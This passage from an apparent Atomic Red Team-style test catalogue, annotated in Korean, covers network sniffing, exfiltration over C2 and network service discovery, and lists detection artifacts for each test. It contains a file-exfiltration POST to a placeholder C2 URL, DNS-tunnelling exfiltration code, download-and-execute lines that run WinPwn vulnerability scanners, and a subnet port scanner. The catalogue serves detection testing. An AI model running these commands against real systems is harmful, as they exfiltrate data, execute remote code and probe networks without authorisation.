        "관리자 권한이 필요하다(필터 추가/제거 작업은 일반적으로 관리자 권한 요구)."
      ],
      "artifacts": {
        "files_created": [],
        "files_read": [],
        "registry_keys": [],
        "processes": [
          {
            "name": "pktmon.exe",
            "description": "포트 기반 필터를 추가하여 이후 pktmon 캡처에서 특정 포트(예: 445) 트래픽만 수집하도록 설정하는 유틸리티.",
            "commandline_pattern": "pktmon.exe filter add -p 445"
          }
        ],
        "network": []
      },
      "cleanup": [
        "pktmon filter remove"
      ],
      "metadata": {
        "atomic_source_id": "855fb8b4-b8ab-4785-ae77-09f5df7bff55"
      }
    },
    {
      "test_id": "T1040-5",
      "name": "PowerShell Network Sniffing (NetEvent Packet Capture)",
      "platforms": ["windows"],
      "summary": "PowerShell의 New-NetEventSession 및 Add-NetEventPacketCaptureProvider cmdlet을 사용하여 네트워크 패킷을 ETL 파일로 캡처하는 테스트이다. 캡처 세션 생성 → 패킷 캡처 Provider 추가 → 세션 시작/중지 → 세션 제거 순으로 수행하며, 결과는 %TEMP%\\sniff.etl 에 저장된다.",
      "procedure": [
        "관리자 권한 PowerShell 세션을 연다.",
        "New-NetEventSession -Name Capture007 -LocalFilePath \"$ENV:Temp\\sniff.etl\" 명령으로 ETL 출력 파일 경로를 지정한 캡처 세션을 생성한다.",
        "Add-NetEventPacketCaptureProvider -SessionName Capture007 -TruncationLength 100 명령으로 패킷 캡처 Provider 를 추가하고 패킷 길이를 100바이트로 잘라서 기록하도록 설정한다.",
        "Start-NetEventSession -Name Capture007 명령을 실행해 세션 기반 네트워크 캡처를 시작한다.",
        "짧은 시간 동안 네트워크 트래픽이 발생하도록 둔 뒤, Stop-NetEventSession -Name Capture007 로 캡처를 중지한다.",
        "Remove-NetEventSession -Name Capture007 로 세션 구성을 제거한다.",
        "cleanup 단계에서 $ENV:Temp\\sniff.etl 파일을 삭제해 ETL 로그를 정리한다."
      ],
      "commands": [
        {
          "executor": "powershell",
          "elevation_required": true,
          "command": "New-NetEventSession -Name Capture007 -LocalFilePath \"$ENV:Temp\\sniff.etl\"\nAdd-NetEventPacketCaptureProvider -SessionName Capture007 -TruncationLength 100\nStart-NetEventSession -Name Capture007\nStop-NetEventSession -Name Capture007\nRemove-NetEventSession -Name Capture007"
        }
      ],
      "prerequisites": [
        "New-NetEventSession, Add-NetEventPacketCaptureProvider 등 NetEvent 관련 cmdlet을 지원하는 Windows 버전(일반적으로 Server 2012+ 또는 최신 클라이언트 OS)이어야 한다.",
        "PowerShell 세션은 관리자 권한으로 실행되어야 한다.",
        "$ENV:Temp 경로에 ETL 파일을 생성/삭제할 수 있는 권한이 필요하다."
      ],
      "artifacts": {
        "files_created": [
          {
            "path": "%TEMP%\\sniff.etl",
            "description": "NetEventSession 기반 네트워크 캡처 결과가 저장되는 ETL 파일."
          }
        ],
        "files_read": [],
        "registry_keys": [],
        "processes": [
          {
            "name": "powershell.exe",
            "description": "New-NetEventSession / Add-NetEventPacketCaptureProvider / Start-NetEventSession 등을 호출하여 커널 수준 네트워크 캡처를 제어하는 스크립트 실행 프로세스.",
            "commandline_pattern": "New-NetEventSession -Name Capture007 -LocalFilePath *sniff.etl*"
          }
        ],
        "network": [
          {
            "protocol": "N/A",
            "description": "NetEvent 기반 캡처는 NIC를 통과하는 모든 트래픽을 수집하며, 해당 cmdlet 자체는 추가적인 네트워크 트래픽을 생성하지 않는다."
          }
        ]
      },
      "cleanup": [
        "del $ENV:Temp\\sniff.etl"
      ],
      "metadata": {
        "atomic_source_id": "9c15a7de-de14-46c3-bc2a-6d94130986ae"
      }
    }
  ]
},
{
  "technique_id": "T1041",
  "technique_name": "Exfiltration Over C2 Channel",
  "tactic": "Exfiltration",
  "description": "공격자가 이미 구축한 명령·제어(Command and Control, C2) 채널을 이용해 피해 시스템에서 외부 서버로 데이터를 전송하는 기법이다. HTTP(S), DNS, 맞춤형 프로토콜 등을 사용해 평상시 C2 트래픽에 데이터를 섞어 보내며, 별도의 유출 채널 없이 탐지를 회피하면서 정보 유출을 시도한다.",

  "tests": [
    {
      "test_id": "T1041-1",
      "name": "C2 Data Exfiltration",
      "platforms": ["windows"],

      "summary": "피해 시스템에 존재하는 파일 내용을 HTTP POST 요청으로 C2 서버에 전송하는 단순 데이터 유출 시나리오를 시뮬레이션한다. 테스트 파일이 없으면 예제 내용을 자동으로 생성한 뒤, PowerShell의 Invoke-WebRequest를 사용해 지정된 URL로 파일 내용을 전송한다.",

      "procedure": [
        "테스트 대상 파일 경로(기본: %TEMP%\\LineNumbers.txt)가 존재하는지 확인한다.",
        "파일이 없으면 1~100번까지의 번호가 포함된 예제 텍스트 라인을 생성해 파일로 저장한다.",
        "Expect100Continue 옵션을 비활성화해 HTTP 통신 옵션을 조정한다.",
        "Get-Content로 파일 내용을 읽어 변수에 저장한다.",
        "Invoke-WebRequest를 사용해 destination_url로 파일 내용을 HTTP POST 방식으로 전송한다."
      ],

      "commands": [
        {
          "executor": "powershell",
          "elevation_required": false,
          "command": "if(-not (Test-Path #{filepath})){ 1..100 | ForEach-Object { Add-Content -Path #{filepath} -Value \"This is line $_.\" } }; [System.Net.ServicePointManager]::Expect100Continue = $false; $filecontent = Get-Content -Path #{filepath}; Invoke-WebRequest -Uri #{destination_url} -Method POST -Body $filecontent -DisableKeepAlive"
        }
      ],

      "prerequisites": [
        "테스트용 파일을 생성하거나 접근할 수 있는 권한이 있어야 한다.",
        "destination_url에 대해 아웃바운드 HTTP(S) 통신이 허용되어 있어야 한다.",
        "C2 서버(또는 모의 서버)가 destination_url에서 수신을 처리할 준비가 되어 있어야 한다."
      ],

      "artifacts": {
        "files_created": [
          {
            "path": "%TEMP%\\LineNumbers.txt",
            "description": "1~100번까지의 예제 텍스트 라인이 기록된 테스트용 파일 (존재하지 않을 경우 생성됨)"
          }
        ],
        "files_read": [
          {
            "path": "%TEMP%\\LineNumbers.txt",
            "description": "C2 서버로 전송되는 데이터의 원본 파일"
          }
        ],
        "registry_keys": [],
        "processes": [
          {
            "name": "powershell.exe",
            "description": "테스트 실행 및 HTTP POST 요청을 수행하는 PowerShell 프로세스",
            "commandline_pattern": "Invoke-WebRequest -Uri * -Method POST -Body *"
          }
        ],
        "network": [
          {
            "protocol": "HTTP/HTTPS",
            "description": "Invoke-WebRequest를 통한 destination_url 향 POST 요청 트래픽",
            "destination_pattern": "#{destination_url}"
          }
        ]
      },

      "cleanup": [
        "%TEMP%\\LineNumbers.txt 테스트 파일을 삭제해 테스트로 생성된 데이터를 제거할 수 있다.",
        "C2/모의 서버에 저장된 수신 데이터도 필요 시 삭제해 실험 흔적을 줄일 수 있다."
      ],

      "metadata": {
        "atomic_source_id": "d1253f6e-c29b-49dc-b466-2147a6191932"
      }
    },

    {
      "test_id": "T1041-2",
      "name": "Text Based Data Exfiltration using DNS subdomains",
      "platforms": ["windows"],

      "summary": "텍스트 데이터를 Base64로 인코딩한 후, 일정 길이로 잘라 DNS 쿼리의 서브도메인에 실어 보내는 DNS 터널링 기반 데이터 유출 시나리오를 시뮬레이션한다. PowerShell에서 Resolve-DnsName을 반복 호출해 exfiltrated_data가 dns_server로 점진적으로 전송되는 행위를 재현한다.",

      "procedure": [
        "dns_server, exfiltrated_data, chunk_size 입력 값을 설정한다.",
        "exfiltrated_data 문자열을 UTF-8 바이트로 변환한 뒤 Base64 문자열로 인코딩한다.",
        "Base64 문자열을 chunk_size 길이 단위로 분할해 여러 개의 청크 목록을 만든다.",
        "각 청크에 \".\"와 dns_server를 이어 붙여 FQDN 형태의 도메인 이름을 구성한다.",
        "각 도메인 이름에 대해 Resolve-DnsName으로 DNS 조회를 수행하고, 쿼리 사이에 지연(Start-Sleep)을 둔다."
      ],

      "commands": [
        {
          "executor": "powershell",
          "elevation_required": false,
          "command": "$dnsServer = \"#{dns_server}\"; $exfiltratedData = \"#{exfiltrated_data}\"; $chunkSize = #{chunk_size}; $encodedData = [System.Text.Encoding]::UTF8.GetBytes($exfiltratedData); $encodedData = [Convert]::ToBase64String($encodedData); $chunks = $encodedData -split \"(.{$chunkSize})\"; foreach ($chunk in $chunks) { $dnsQuery = $chunk + \".\" + $dnsServer; Resolve-DnsName -Name $dnsQuery; Start-Sleep -Seconds 5 }"
        }
      ],

      "prerequisites": [
        "dns_server로 지정된 도메인/서버에 대한 DNS 쿼리가 외부로 전송될 수 있어야 한다.",
        "네트워크 환경에서 아웃바운드 DNS 트래픽이 차단되지 않아야 한다.",
        "exfiltrated_data에 유출을 가정한 문자열 또는 테스트 데이터를 정의해 두어야 한다."
      ],

      "artifacts": {
        "files_created": [],
        "files_read": [],
        "registry_keys": [],
        "processes": [
          {
            "name": "powershell.exe",
            "description": "DNS 서브도메인을 이용한 데이터 인코딩 및 Resolve-DnsName 호출을 수행하는 PowerShell 프로세스",
            "commandline_pattern": "Resolve-DnsName -Name *"
          }
        ],
        "network": [
          {
            "protocol": "DNS",
            "description": "exfiltrated_data를 Base64 청크로 나눈 서브도메인을 포함한 반복적인 DNS 조회 트래픽",
            "destination_pattern": "*.#{dns_server}"
          }
        ]
      },

      "cleanup": [
        "테스트 시나리오에 사용된 exfiltrated_data 값이 민감 정보라면 스크립트/로그 등에서 해당 값을 제거한다.",
        "DNS 서버 또는 네트워크 분석 도구에 남은 테스트용 쿼리 로그를 정리할 수 있다."
      ],

      "metadata": {
        "atomic_source_id": "c9207f3e-213d-4cc7-ad2a-7697a7237df9"
      }
    }
  ]
},
{
  "technique_id": "T1046",
  "technique_name": "Network Service Discovery",
  "tactic": "Discovery",
  "description": "공격자가 대상 시스템이나 네트워크 상에서 어떤 포트와 서비스가 열려 있는지 파악하기 위해 수행하는 스캔 기법이다. Nmap, PowerShell, 자체 스크립트 등을 활용해 특정 호스트 또는 서브넷 전체에 연결을 시도하며, 취약한 서비스나 원격 공격에 활용 가능한 지점을 식별하는 것이 목적이다.",

  "tests": [
    {
      "test_id": "T1046-1",
      "name": "Port Scan NMap for Windows",
      "platforms": ["windows"],

      "summary": "Windows 환경에서 Nmap을 이용해 로컬 호스트(127.0.0.1)의 열려 있는 포트를 스캔하는 시나리오이다. Nmap이 설치되어 있지 않은 경우, PowerShell을 통해 설치 프로그램을 내려받아 자동 설치한 뒤 포트 스캔을 수행한다.",

      "procedure": [
        "PowerShell에서 Nmap 명령어가 동작하는지(prereq_command) 확인한다.",
        "설치되지 않았다면 지정된 nmap_url에서 설치 파일을 다운로드해 ExternalPayloads 폴더에 저장한다.",
        "다운로드한 Nmap 설치 파일을 무인 설치 옵션(/S)으로 실행해 설치를 완료한다.",
        "nmap #{host_to_scan} 명령을 실행해 지정된 호스트(기본 127.0.0.1)의 포트를 스캔한다."
      ],

      "commands": [
        {
          "executor": "powershell",
          "elevation_required": true,
          "command": "nmap #{host_to_scan}"
        }
      ],

      "prerequisites": [
        "테스트 시스템에서 PowerShell 실행이 허용되어 있어야 한다.",
        "외부 인터넷에 접근 가능해야 하며, nmap_url에 대한 HTTP/HTTPS 다운로드가 허용되어야 한다.",
        "Nmap 설치를 위한 관리자 권한 또는 적절한 설치 권한이 필요할 수 있다."
      ],

      "artifacts": {
        "files_created": [
          {
            "path": "PathToAtomicsFolder\\..\\ExternalPayloads\\nmap-7.80-setup.exe",
            "description": "원격에서 다운로드된 Nmap 설치 파일"
          }
        ],
        "files_read": [],
        "registry_keys": [],
        "processes": [
          {
            "name": "powershell.exe",
            "description": "Nmap 존재 여부 확인, 설치 파일 다운로드 및 실행, nmap 스캔 명령 수행에 사용되는 PowerShell 프로세스",
            "commandline_pattern": "Invoke-WebRequest *nmap-7.80-setup.exe*; Start-Process *nmap-7.80-setup.exe* /S; nmap *"
          },
          {
            "name": "nmap.exe",
            "description": "포트 스캔을 수행하는 Nmap 프로세스",
            "commandline_pattern": "nmap *"
          }
        ],
        "network": [
          {
            "protocol": "HTTP/HTTPS",
            "description": "nmap_url에서 설치 파일을 다운로드하기 위한 아웃바운드 트래픽",
            "destination_pattern": "#{nmap_url}"
          },
          {
            "protocol": "TCP",
            "description": "Nmap이 host_to_scan(기본 127.0.0.1)에 대해 여러 포트로 시도하는 포트 스캔 트래픽",
            "destination_pattern": "#{host_to_scan}:*"
          }
        ]
      },

      "cleanup": [
        "PathToAtomicsFolder\\..\\ExternalPayloads\\nmap-7.80-setup.exe 파일을 삭제해 설치 파일 흔적을 제거할 수 있다.",
        "테스트 목적으로만 설치했다면 Nmap 프로그램 자체를 수동으로 제거할 수 있다."
      ],

      "metadata": {
        "atomic_source_id": "d696a3cb-d7a8-4976-8eb5-5af4abf2e3df"
      }
    },

    {
      "test_id": "T1046-2",
      "name": "Port Scan using python",
      "platforms": ["windows"],

      "summary": "Python 스크립트(T1046.py)를 이용해 지정된 호스트의 포트를 스캔하는 시나리오이다. 시스템에 Python이 설치되어 있지 않은 경우, PowerShell로 설치 파일을 다운로드 및 무인 설치한 후 스캔 스크립트를 실행한다.",

      "procedure": [
        "PowerShell에서 py 명령이 존재하는지(Get-Command py)로 Python 설치 여부를 확인한다.",
        "Python이 없으면 공식 사이트에서 설치 프로그램을 다운로드해 ExternalPayloads 폴더에 저장한다.",
        "다운로드한 python_setup.exe를 /quiet 옵션으로 무인 설치해 PATH에 Python을 추가한다.",
        "python \"#{filename}\" -i #{host_ip} 명령으로 T1046.py 스크립트를 실행해 대상 호스트의 포트를 스캔한다."
      ],

      "commands": [
        {
          "executor": "powershell",
          "elevation_required": false,
          "command": "python \"#{filename}\" -i #{host_ip}"
        }
      ],

      "prerequisites": [
        "테스트 시스템에서 PowerShell 실행이 허용되어 있어야 한다.",
        "외부 인터넷에 접근 가능해야 하며, python.org에서 설치 파일을 다운로드할 수 있어야 한다.",
        "T1046.py 스크립트가 PathToAtomicsFolder\\T1046\\src\\T1046.py 위치에 존재해야 한다."
      ],

      "artifacts": {
        "files_created": [
          {
            "path": "PathToAtomicsFolder\\..\\ExternalPayloads\\python_setup.exe",
            "description": "원격에서 다운로드된 Python 설치 파일"
          }
        ],
        "files_read": [
          {
            "path": "PathToAtomicsFolder\\T1046\\src\\T1046.py",
            "description": "포트 스캔 로직을 포함한 Python 스크립트"
          }
        ],
        "registry_keys": [],
        "processes": [
          {
            "name": "powershell.exe",
            "description": "Python 설치 여부 확인 및 설치 파일 다운로드/실행, Python 스크립트 호출을 수행하는 PowerShell 프로세스",
            "commandline_pattern": "invoke-webrequest *python-3.10.4-amd64.exe*; Start-Process *python_setup.exe* *; python *T1046.py*"
          },
          {
            "name": "python.exe",
            "description": "대상 호스트에 대한 포트 스캔을 수행하는 Python 프로세스",
            "commandline_pattern": "python *T1046.py* -i *"
          }
        ],
        "network": [
          {
            "protocol": "HTTP/HTTPS",
            "description": "Python 설치 파일 다운로드를 위한 아웃바운드 트래픽",
            "destination_pattern": "https://www.python.org/ftp/python/3.10.4/*"
          },
          {
            "protocol": "TCP",
            "description": "Python 스크립트가 host_ip에 대해 수행하는 포트 스캔 트래픽",
            "destination_pattern": "#{host_ip}:*"
          }
        ]
      },

      "cleanup": [
        "PathToAtomicsFolder\\..\\ExternalPayloads\\python_setup.exe 파일을 삭제해 설치 파일 흔적을 제거할 수 있다.",
        "테스트용으로만 설치했다면 Python 설치를 수동으로 제거할 수 있다."
      ],

      "metadata": {
        "atomic_source_id": "6ca45b04-9f15-4424-b9d3-84a217285a5c"
      }
    },

    {
      "test_id": "T1046-3",
      "name": "WinPwn - spoolvulnscan",
      "platforms": ["windows"],

      "summary": "WinPwn 프레임워크의 spoolvulnscan 기능을 이용해 MS-RPRN RPC 서비스 취약성이 존재하는 시스템을 스캔하는 시나리오이다. 원격 GitHub에서 WinPwn.ps1을 로드한 뒤, 도메인 내 시스템에 대해 취약한 인쇄 스풀러 관련 서비스를 탐색한다.",

      "procedure": [
        "PowerShell에서 net.webclient 객체를 생성해 원격 스크립트 다운로드를 준비한다.",
        "https://raw.githubusercontent.com 경로에서 WinPwn.ps1 스크립트 내용을 다운로드하고 iex로 메모리 상에 로드한다.",
        "spoolvulnscan -noninteractive -consoleoutput 명령을 실행해 도메인 내 시스템을 대상으로 MS-RPRN RPC 서비스 취약성을 스캔한다.",
        "콘솔 출력으로 취약 가능성이 있는 호스트 목록을 확인한다."
      ],

      "commands": [
        {
          "executor": "powershell",
          "elevation_required": false,
          "command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); spoolvulnscan -noninteractive -consoleoutput"
        }
      ],

      "prerequisites": [
        "도메인 환경 또는 스캔 대상 Windows 시스템들이 네트워크 상에 연결되어 있어야 한다.",
        "원격 GitHub(raw.githubusercontent.com)에 대한 HTTPS 접근이 허용되어야 한다.",
        "MS-RPRN RPC 서비스 스캔을 위한 네트워크 통신이 방화벽에 의해 차단되지 않아야 한다."
      ],

      "artifacts": {
        "files_created": [],
        "files_read": [],
        "registry_keys": [],
        "processes": [
          {
            "name": "powershell.exe",
            "description": "WinPwn.ps1 스크립트를 원격에서 로드하고 spoolvulnscan 함수를 실행하는 PowerShell 프로세스",
            "commandline_pattern": "downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/*/WinPwn.ps1'); spoolvulnscan *"
          }
        ],
        "network": [
          {
            "protocol": "HTTPS",
            "description": "GitHub raw 콘텐츠에서 WinPwn.ps1 스크립트를 다운로드하는 트래픽",
            "destination_pattern": "raw.githubusercontent.com"
          },
          {
            "protocol": "TCP",
            "description": "MS-RPRN RPC 서비스 취약성 스캔을 위해 도메인 내 여러 호스트와 통신하는 트래픽",
            "destination_pattern": "*:RPC/*"
          }
        ]
      },

      "cleanup": [
        "메모리 상에만 로드되므로 디스크에 별도 스크립트를 저장하지 않았다면 추가 파일 삭제는 필요 없다.",
        "WinPwn 관련 실행 기록(예: PowerShell Operational 로그, 네트워크 로그 등)은 DFIR 분석 목적이 아니라면 보존 또는 정리 정책에 따라 관리할 수 있다."
      ],

      "metadata": {
        "atomic_source_id": "54574908-f1de-4356-9021-8053dd57439a"
      }
    },

    {
      "test_id": "T1046-4",
      "name": "WinPwn - MS17-10",
      "platforms": ["windows"],

      "summary": "WinPwn의 MS17-10 함수를 사용해 도메인 내에서 MS17-010(EternalBlue) 취약성에 노출된 Windows 서버를 검색하는 시나리오이다. 원격 GitHub에서 WinPwn.ps1을 로드한 뒤 MS17-10 -noninteractive -consoleoutput을 실행해 취약한 호스트를 식별한다.",

      "procedure": [
        "PowerShell에서 net.webclient를 이용해 WinPwn.ps1을 원격에서 다운로드하고 iex로 로드한다.",
        "MS17-10 -noninteractive -consoleoutput 명령을 실행해 도메인 내 호스트 중 MS17-010 취약성을 가진 시스템을 스캔한다.",
        "콘솔 출력에 취약 가능성이 있는 호스트 목록과 관련 정보가 표시된다."
      ],

      "commands": [
        {
          "executor": "powershell",
          "elevation_required": false,
          "command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); MS17-10 -noninteractive -consoleoutput"
        }
      ],

      "prerequisites": [
        "도메인 내 Windows 서버들이 네트워크 상에서 접근 가능해야 한다.",
        "GitHub raw 콘텐츠에 대한 HTTPS 접근이 허용되어야 한다.",
        "MS17-010 취약성 스캔에 필요한 포트(예: SMB 445)에 대한 네트워크 접근이 차단되지 않아야 한다."
      ],

      "artifacts": {
        "files_created": [],
        "files_read": [],
        "registry_keys": [],
        "processes": [
          {
            "name": "powershell.exe",
            "description": "WinPwn.ps1 로드 및 MS17-10 취약성 스캔 함수를 실행하는 PowerShell 프로세스",
            "commandline_pattern": "downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/*/WinPwn.ps1'); MS17-10 *"
          }
        ],
        "network": [
          {
            "protocol": "HTTPS",
            "description": "WinPwn.ps1 스크립트를 GitHub raw에서 다운로드하는 트래픽",
            "destination_pattern": "raw.githubusercontent.com"
          },
          {
            "protocol": "TCP",
            "description": "MS17-010 취약성 탐지를 위한 SMB/네트워크 스캔 트래픽",
            "destination_pattern": "*:445"
          }
        ]
      },

      "cleanup": [
        "디스크에 추가 파일이 생성되지 않았다면 별도 파일 삭제는 필요 없다.",
        "MS17-10 스캔과 관련된 이벤트 로그, 네트워크 로그는 정책에 따라 보존 또는 정리할 수 있다."
      ],

      "metadata": {
        "atomic_source_id": "97585b04-5be2-40e9-8c31-82157b8af2d6"
      }
    },

    {
      "test_id": "T1046-5",
      "name": "WinPwn - bluekeep",
      "platforms": ["windows"],

      "summary": "WinPwn의 bluekeep 함수를 이용해 도메인 내 BlueKeep(RDP 서비스) 취약성이 존재하는 Windows 시스템을 탐색하는 시나리오이다. 스캔에 시간이 오래 걸릴 수 있으며, 원격에서 로드한 WinPwn.ps1을 통해 네트워크 상의 여러 호스트를 점검한다.",

      "procedure": [
        "PowerShell에서 net.webclient로 WinPwn.ps1을 GitHub raw에서 다운로드하고 iex로 로드한다.",
        "bluekeep -noninteractive -consoleoutput 명령을 실행해 도메인 내 RDP 서비스가 활성화된 시스템 중 BlueKeep 취약성이 있는 시스템을 스캔한다.",
        "콘솔 출력으로 스캔 진행 상황과 취약 여부 결과를 확인한다."
      ],

      "commands": [
        {
          "executor": "powershell",
          "elevation_required": false,
          "command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); bluekeep -noninteractive -consoleoutput"
        }
      ],

      "prerequisites": [
        "도메인 내에서 RDP가 활성화된 Windows 시스템들이 네트워크 상에서 접근 가능해야 한다.",
        "원격 GitHub raw 콘텐츠에 대한 HTTPS 접근이 허용되어야 한다.",
        "RDP 및 관련 포트에 대한 네트워크 스캔이 방화벽에서 허용되어야 한다."
      ],

      "artifacts": {
        "files_created": [],
        "files_read": [],
        "registry_keys": [],
        "processes": [
          {
            "name": "powershell.exe",
            "description": "WinPwn.ps1 로드 및 bluekeep 취약성 스캔을 수행하는 PowerShell 프로세스",
            "commandline_pattern": "downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/*/WinPwn.ps1'); bluekeep *"
          }
        ],
        "network": [
          {
            "protocol": "HTTPS",
            "description": "BlueKeep 스캔 수행을 위해 WinPwn.ps1 스크립트를 다운로드하는 트래픽",
            "destination_pattern": "raw.githubusercontent.com"
          },
          {
            "protocol": "TCP",
            "description": "도메인 내 여러 시스템에 대해 RDP 관련 포트(예: 3389)를 탐지·스캔하는 트래픽",
            "destination_pattern": "*:3389"
          }
        ]
      },

      "cleanup": [
        "로컬에 스크립트를 저장하지 않는 경우 추가 파일 삭제 없이 테스트 흔적은 주로 로그/네트워크 기록으로 남는다.",
        "BlueKeep 스캔 관련 로그는 DFIR 목적으로 보존하거나 정책에 따라 정리할 수 있다."
      ],

      "metadata": {
        "atomic_source_id": "1cca5640-32a9-46e6-b8e0-fabbe2384a73"
      }
    },

    {
      "test_id": "T1046-6",
      "name": "WinPwn - fruit",
      "platforms": ["windows"],

      "summary": "WinPwn의 fruit 기능을 이용해 네트워크 상의 잠재적으로 취약한 웹 애플리케이션(저위험·저노력 취약점, low-hanging fruits)을 탐색하는 시나리오이다. WinPwn.ps1을 원격 로드한 후 fruit -noninteractive -consoleoutput으로 스캔을 수행한다.",

      "procedure": [
        "PowerShell에서 net.webclient를 사용해 GitHub raw에서 WinPwn.ps1 스크립트를 다운로드하고 iex로 로드한다.",
        "fruit -noninteractive -consoleoutput 명령을 실행해 도메인 또는 지정된 범위 내 웹 애플리케이션을 스캔한다.",
        "콘솔로 출력되는 잠재적 취약 웹 애플리케이션 목록을 확인한다."
      ],

      "commands": [
        {
          "executor": "powershell",
          "elevation_required": false,
          "command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); fruit -noninteractive -consoleoutput"
        }
      ],

      "prerequisites": [
        "스캔 대상 네트워크에 웹 서버 또는 웹 애플리케이션이 존재해야 한다.",
        "GitHub raw 콘텐츠에 대한 HTTPS 접근이 허용되어야 한다.",
        "웹 스캔 트래픽(HTTP/HTTPS)에 대한 아웃바운드·인바운드 통신이 방화벽에서 허용되어야 한다."
      ],

      "artifacts": {
        "files_created": [],
        "files_read": [],
        "registry_keys": [],
        "processes": [
          {
            "name": "powershell.exe",
            "description": "WinPwn.ps1을 로드하고 fruit 스캔을 수행하는 PowerShell 프로세스",
            "commandline_pattern": "downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/*/WinPwn.ps1'); fruit *"
          }
        ],
        "network": [
          {
            "protocol": "HTTPS",
            "description": "WinPwn.ps1을 GitHub raw에서 다운로드하는 트래픽",
            "destination_pattern": "raw.githubusercontent.com"
          },
          {
            "protocol": "HTTP/HTTPS",
            "description": "fruit 스캔 중 취약 웹 애플리케이션을 찾기 위해 여러 호스트의 웹 서비스에 접속하는 트래픽",
            "destination_pattern": "*:80, *:443"
          }
        ]
      },

      "cleanup": [
        "메모리 로드 방식만 사용했다면 디스크 상에 추가 스크립트가 남지 않는다.",
        "웹 애플리케이션 스캔 기록(웹 서버 로그, 프록시 로그 등)은 정책에 따라 보존하거나 정리할 수 있다."
      ],

      "metadata": {
        "atomic_source_id": "bb037826-cbe8-4a41-93ea-b94059d6bb98"
      }
    },

    {
      "test_id": "T1046-7",
      "name": "Port-Scanning /24 Subnet with PowerShell",
      "platforms": ["windows"],

      "summary": "PowerShell과 .NET TcpClient를 사용해 /24 서브넷 내 호스트의 특정 포트(기본 445, 3389)를 스캔하는 시나리오이다. IP 주소를 직접 지정하거나, 지정하지 않으면 로컬 시스템의 기본 IPv4 인터페이스 정보를 기반으로 /24 대역을 자동 탐지해 스캔한다.",

      "procedure": [
        "입력 인자 ip_address를 확인해 쉼표(,)가 포함된 다중 IP 리스트인지, 단일 IP인지, 또는 공백인지 판단한다.",
        "여러 IP가 지정된 경우 각 IP와 port_list에 지정된 포트 각각에 대해 TcpClient.ConnectAsync를 사용해 연결을 시도하고, 연결에 성공하면 해당 포트가 열려 있음을 출력한다.",
        "ip_address가 비어 있으면 Get-NetIPInterface와 Get-NetIPAddress를 사용해 기본 IPv4 인터페이스와 IP 주소를 자동으로 선택한다.",
        "선택된 IP 주소의 앞 세 옥텟을 기준으로 /24 서브넷(1~254)을 구성하고, 각 IP와 port_list에 대해 TcpClient.ConnectAsync로 연결을 시도한다.",
        "연결에 성공한 IP:포트 조합에 대해 \"Port <port> is open on <ip>\" 메시지를 출력한다."
      ],

      "commands": [
        {
          "executor": "powershell",
          "elevation_required": false,
          "command": "$ipAddr = \"#{ip_address}\"; if ($ipAddr -like \"*,*\") { $ip_list = $ipAddr -split \",\"; $ip_list = $ip_list.ForEach({ $_.Trim() }); Write-Host \"[i] IP Address List: $ip_list\"; $ports = #{port_list}; foreach ($ip in $ip_list) { foreach ($port in $ports) { Write-Host \"[i] Establishing connection to: $ip : $port\"; try { $tcp = New-Object Net.Sockets.TcpClient; $tcp.ConnectAsync($ip, $port).Wait(#{timeout_ms}) | Out-Null } catch {} if ($tcp.Connected) { $tcp.Close(); Write-Host \"Port $port is open on $ip\" } } } } elseif ($ipAddr -notlike \"*,*\") { if ($ipAddr -eq \"\") { $interface = Get-NetIPInterface -AddressFamily IPv4 -ConnectionState Connected | Select-Object -ExpandProperty InterfaceAlias -First 1; Write-Host \"[i] Using Interface $interface\"; $ipAddr = Get-NetIPAddress -AddressFamily IPv4 -InterfaceAlias $interface | Select-Object -ExpandProperty IPAddress } Write-Host \"[i] Base IP-Address for Subnet: $ipAddr\"; $subnetSubstring = $ipAddr.Substring(0, $ipAddr.LastIndexOf('.') + 1); Write-Host \"[i] Assuming /24 subnet. scanning $subnetSubstring'1' to $subnetSubstring'254'\"; $ports = #{port_list}; $subnetIPs = 1..254 | ForEach-Object { \"$subnetSubstring$_\" }; foreach ($ip in $subnetIPs) { foreach ($port in $ports) { try { $tcp = New-Object Net.Sockets.TcpClient; $tcp.ConnectAsync($ip, $port).Wait(#{timeout_ms}) | Out-Null } catch {} if ($tcp.Connected) { $tcp.Close(); Write-Host \"Port $port is open on $ip\" } } } } else { Write-Host \"[Error] Invalid Inputs\"; exit 1 }"
        }
      ],

      "prerequisites": [
        "PowerShell에서 Get-NetIPInterface 및 Get-NetIPAddress cmdlet을 사용할 수 있어야 한다(최근 Windows 버전 권장).",
        "스캔 대상 /24 서브넷 또는 IP 리스트에 대한 아웃바운드 TCP 연결이 방화벽에 의해 전면 차단되어 있지 않아야 한다.",
        "포트 스캔이 허용된 테스트/연구 환경에서만 사용할 것을 권장한다."
      ],

      "artifacts": {
        "files_created": [],
        "files_read": [],
        "registry_keys": [],
        "processes": [
          {
            "name": "powershell.exe",
            "description": "서브넷 내 여러 IP와 지정된 포트에 대해 TcpClient를 사용해 포트 스캔을 수행하는 PowerShell 프로세스",
            "commandline_pattern": "*New-Object Net.Sockets.TcpClient*ConnectAsync*"
          }
        ],
        "network": [
          {
            "protocol": "TCP",
            "description": "/24 서브넷 전체 또는 지정된 IP 리스트에 대해 port_list에 포함된 포트로 연결을 시도하는 포트 스캔 트래픽",
            "destination_pattern": "<target_subnet_or_ip_list>:#{port_list}"
          }
        ]
      },

      "cleanup": [
        "이 테스트는 별도의 파일을 생성하지 않으므로 추가적인 파일 삭제는 필요 없다.",
        "콘솔 출력과 관련 PowerShell 실행 기록, 네트워크 로그는 DFIR 목적에 따라 보존하거나 정리할 수 있다."
      ],

      "metadata": {
        "atomic_source_id": "05df2a79-dba6-4088-a804-9ca0802ca8e4"
      }
    },

    {
      "test_id": "T1046-8",
